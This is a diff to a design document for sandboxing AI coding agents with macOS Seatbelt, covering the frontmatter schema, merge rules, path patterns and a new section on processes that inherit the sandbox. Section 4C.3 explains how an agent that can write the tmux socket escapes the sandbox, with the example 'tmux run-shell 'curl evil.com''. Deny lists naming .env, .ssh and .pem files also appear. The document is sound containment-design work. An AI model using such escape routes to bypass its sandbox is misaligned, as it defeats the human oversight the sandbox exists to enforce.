@@ -144,26 +144,35 @@ is possible — but only by an **explicit** `allowRead: ["/"]` in the `.md`, nev
 by default. This is the opposite of the reference project's allow-by-default
 `(allow default)` skeleton; §5.1 flips it to `(deny default)`.
 
+⚠️ **Schema is FLAT — ONE level of nesting (R1 fix).** The frontmatter parser
+(`parseAgentTypeFile`, `agent-types.ts:66-158`) supports only **one** level of
+nesting (a parent object with scalar/list children — exactly how `permissions:`
+works). A two-level `sandbox.filesystem.allowRead` would parse **silently into
+garbage** (the `filesystem:` key becomes an empty list; `allowRead:` flattens into
+the `sandbox` object). So `sandbox:` is a single object whose children are the
+scalar `enabled` and the four lists directly — NO `filesystem:`/`network:`
+sub-objects:
+
 ```yaml
 name: netletworker
 sandbox:
   enabled: true              # default false → agent runs UNSANDBOXED (today's behavior)
                              # true → deny-by-default; only what's listed below is reachable
-  filesystem:
-    # Baseline (worktree, git-common-dir, ~/.claude, OS/runtime paths, /tmp, DNS
-    # socket) is ALWAYS merged in so the agent can boot — see §4A.7. The lists
-    # below ADD to that baseline.
-    allowRead:  ["~/.config/foo"]
-    allowWrite: ["/tmp/agent-scratch"]
-    deny:       ["**/.env", "~/.ssh"]   # carves holes inside the allowed set; deny always wins
-    # Fully-open escape hatch (must be explicit, per Adam):
-    #   allowRead: ["/"]
-    #   allowWrite: ["/"]
-  network:
-    # deny-by-default too: kernel blocks ALL non-localhost egress; the proxy then
-    # permits ONLY these domains. No "blocklist" mode in v1 — allowlist is the model.
-    domains: ["api.anthropic.com", "github.com", "*.githubusercontent.com"]
+  # Filesystem (baseline in §4A.7 is always merged in; these ADD to it):
+  allowRead:  ["~/.config/foo"]
+  allowWrite: ["/tmp/agent-scratch"]
+  deny:       ["**/.env", "~/.ssh"]   # carves holes inside the allowed set; deny always wins
+  # Fully-open escape hatch (must be explicit, per Adam): allowRead: ["/"]
+  # Network — deny-by-default; kernel blocks all non-localhost egress, proxy
+  # permits ONLY these (allowlist only, no blocklist mode in v1):
+  domains:    ["api.anthropic.com", "github.com", "*.githubusercontent.com"]
 ```
+
+This is structurally identical to the existing `permissions: {allow, deny}` block,
+so it parses today with no parser changes. (Alternative considered and rejected:
+teaching the parser two-level nesting — more code, and the flat form reads fine.)
+The `AgentType.sandbox` TypeScript type still models these as grouped fields
+internally; only the `.md` surface is flat.
 
 Design decisions:
 
@@ -203,10 +212,16 @@ Design decisions:
    list fields (`domains`, `allowRead`, `allowWrite`, `deny`) union across the
    chain — a child can **add** access (union its allow) and/or **narrow** access
    (union its deny). Because deny-wins (§4A.0), a child (or any layer) can never
-   re-open what another layer denied. Only the scalar `enabled` uses
-   last-non-empty-wins (like `model`/`effort` at :415-434). This matches the
-   existing `permissions` merge exactly (`mergeRawFrontmatters` :459-467), so the
-   list fields can reuse that machinery; only `enabled` needs the scalar rule.
+   re-open what another layer denied. The scalar `enabled` uses **OR-merge** (any
+   layer setting `enabled: true` wins), NOT last-non-empty-wins — otherwise a leaf
+   type could set `enabled: false` and switch OFF a sandbox that `_all.md` turned
+   on, the most total possible "re-open", which contradicts the whole model.
+   (Adam authors all type files, so last-wins would be *safe* in practice, but
+   OR-merge makes the "a layer can only tighten" invariant hold for `enabled` too.)
+   ⚠️ Implementation note: the `permissions` union is a **hand-written special
+   case** (`mergeRawFrontmatters` :459-467), not generic machinery — so `sandbox`
+   needs analogous **new** merge code (union the four lists, OR-merge `enabled`),
+   modeled on it, not a free reuse.
 
 ## 4A. Path pattern format for allow/deny lists (AUTHORITATIVE)
 
@@ -261,19 +276,29 @@ normalized). Patterns are never matched against relative paths.
 An entry is classified by how it starts. **There is no other form** — anything
 else is a spec error the generator rejects at spawn (fail-closed).
 
-1. **Absolute path** — starts with `/`
+**Classification order (precedence — checked in this order):** glob-detection
+FIRST, then anchor. `/Users/adam/**/*.pem` satisfies both "starts with `/`" and
+"contains a glob char"; it is a **glob** (form 3), because the glob metachars must
+be honored. Only if an entry contains NO glob metachar (`*`, `**`, `?`) is it
+classified by its anchor (form 1 or 2).
+
+1. **Absolute path** (no glob chars) — starts with `/`
    `/Users/adam/.aws`
    → matches that path **and everything under it** (directory subtree).
    Compiles to Seatbelt `(subpath "/Users/adam/.aws")`.
 
-2. **Home-anchored path** — starts with `~/`
+2. **Home-anchored path** (no glob chars) — starts with `~/`
    `~/.ssh`
    → `~` expands to the agent's `$HOME`, then same subtree semantics as (1).
+   **Bare `~` (no trailing slash) is LEGAL** and means `$HOME` (subtree) — the
+   existing `allowedPaths` code special-cases `p === "~"` (`ib-commands.ts:4502`);
+   match that so the two path systems agree.
 
-3. **Glob pattern** — contains `*`, `**`, or `?`
+3. **Glob pattern** — contains `*`, `**`, or `?` (checked first, see above)
    `**/.env`, `/Users/adam/**/*.pem`, `~/secrets/*`
    → compiled to a Seatbelt `(regex #"…")` via a fixed, documented glob→regex
-   translation (§4A.4). This is the ONLY form that can match by basename
+   translation (§4A.4), **anchored at both ends** (`^…$`) so a glob allow can't
+   slip into a near-wildcard. This is the ONLY form that can match by basename
    anywhere on the filesystem.
 
 **Bare names are rejected.** `.env` (no `/`, no glob metachar) is a spec error —
@@ -451,6 +476,91 @@ Why not nest the two sandboxes: two OS sandboxes on one process enforce the
 
 Only when `sandbox.enabled: false` does codex keep its current `-s
 workspace-write` behavior (no change from today).
+
+## 4C. What ELSE runs inside the sandbox (the big gap — from design review)
+
+⚠️ **A Seatbelt profile is inherited by every descendant process.** The agent's
+`claude`/`codex` is not the only thing sandboxed — so is **every hook it fires,
+every `ib` command it runs, every MCP server, and every process a `Bash` tool
+call spawns.** Under `(deny default)`, this is where the design actually bites.
+The baseline (§4A.7) and `_all.md` MUST account for all of the following, or a
+sandboxed agent is broken in ways that look like Claude bugs.
+
+### 4C.1 The `ib` binary and its write targets (highest impact)
+
+A sandboxed agent shells out to `ib` constantly (hooks + `ib send`/`status`/etc.).
+Required in the baseline:
+- **`/usr/local/bin/ib`** readable+executable (added to §4A.7).
+- **The agent's OWN per-worktree dir is MANDATORY, not "candidate".** The worktree
+  is `<agentDir>/repo`, so `meta.json`, `agent.log`, `debug-logs/`, and agent
+  state live in `<agentDir>` — a **sibling of** `WORKTREE`, *outside* the
+  `WORKTREE` subpath. The agent-status hook's `writeAgentState` writes `meta.json`;
+  hooks write `debug-logs/`. Inject `<agentDir>` (or its parent
+  `<repoPath>/.ittybitty/agents/<id>`) as a runtime `-D` writable root alongside
+  `WORKTREE`/`GITDIR`.
+- **`~/.itsybitsy/agents/**` must be WRITE-allowed** in the `_all.md` baseline, or
+  **`ib send` breaks for every sandboxed agent.** Outboxes deliberately live there
+  (`outbox.ts:39-45`, verbatim: moved out of the per-worktree dir precisely so a
+  sandboxed codex could reach ANY agent's outbox via one writable root passed to
+  `--add-dir`). The exact same lesson transfers 1:1 to seatbelt. (This is the
+  second lesson in the codex-roots code; the plan previously used it only for the
+  gitdir computation.)
+- **`ib list`/`ib look`** read every registered repo's `.ittybitty/agents/*/meta.json`
+  (cross-repo reads). Decision: allow-read those trees in the `_all.md` baseline,
+  or accept `ib list` degrading inside sandboxed agents. (Recommend read-allow.)
+- **`ib new-agent` from a sandboxed manager** needs parent-repo `.ittybitty/`
+  mkdir + `.claude/settings.local.json` write — exactly what
+  `deriveCodexParentRepoRoots` grants codex today (`ib-commands.ts:4708-4724`).
+  Reuse that precedent in the baseline for `canSpawnChildren` types.
+
+### 4C.2 Watchdog spawn inheritance (design answer needed, not a spike note)
+
+`ib new-agent` spawns the CHILD's watchdog via `Bun.spawn(["ib","watchdog",id])`
+**in the invoking process** (`ib-commands.ts:5190-5196`). If the invoker is a
+**sandboxed manager**, the child's watchdog inherits the **manager's** Seatbelt
+profile for its whole lifetime — the wrong profile, and the watchdog needs
+`tmux send-keys`, cross-agent-dir writes, and process kills that the manager's
+profile won't grant. (The child's `claude` itself is fine — it's spawned by the
+*unsandboxed* tmux server and then wrapped by its own `start.sh`.) Same inheritance
+hits `generatePromptSummary` and `autoAcceptWorkspaceTrust` fired from a sandboxed
+invoker. **Design options:** route watchdog spawning through the tmux server
+(`tmux run-shell`) so it launches unsandboxed, or have a small `ib` daemon /
+coordinator own watchdog spawning. Pick one before phase 3.
+
+### 4C.3 tmux socket = sandbox escape (needs its own decision)
+
+Anything that can write the tmux socket (`/private/tmp/tmux-<uid>/`) can
+`tmux run-shell '<anything>'`, which executes as a child of the **unsandboxed**
+tmux server — bypassing the kernel network deny wholesale
+(`tmux run-shell 'curl evil.com'`). The candidate baseline grants `/private/tmp`
+read+write, so **this hole is open by default.** Managers genuinely need tmux
+(`ib new-agent` creates sessions); **workers do NOT** — `ib send` only appends to
+outbox files (delivery happens later, recipient-side, outside the sandbox).
+**Recommendation:** deny the tmux socket path for non-spawning types; document the
+escape for manager types as an accepted limitation. Do NOT blanket-allow
+`/private/tmp` — scope it (e.g. allow the specific temp needs, deny the tmux
+socket subpath).
+
+### 4C.4 MCP servers
+
+stdio MCP servers are `claude` children → sandboxed. They need their interpreters
+(`node`/`bun`/`uv` — `~/.bun`, `~/.nvm`, NOT in the candidate baseline), their
+config files, and their **own network** (an MCP server contacting a
+non-allowlisted host fails; HTTP/SSE MCP servers too — their traffic falls under
+the same domain allowlist). The spike MUST boot an agent with a real MCP server
+configured, and `_all.md` must include the interpreter paths. Document that MCP
+network egress is subject to the domain allowlist.
+
+### 4C.5 Realistic isolation story (set expectations in §1)
+
+Once 4C.1's requirements land (`~/.itsybitsy/agents/**` write, agents-dir reads,
+parent-repo `.ittybitty`, `/usr/local/bin`, `~/.claude` write, tmux socket for
+managers), the **kernel layer cannot distinguish "`ib` writing an outbox" from
+"the agent writing an outbox"** — Seatbelt is per-path, not per-binary. The honest
+isolation story: **kernel = coarse walls + network deny; hook (`agent-path.ts`) =
+fine-grained cross-agent etiquette.** Still a big win over today (kernel-blocked
+secrets + a real domain allowlist), but §1 should not oversell worker-vs-worker
+filesystem isolation.
 
 ## 5. Components to build
 
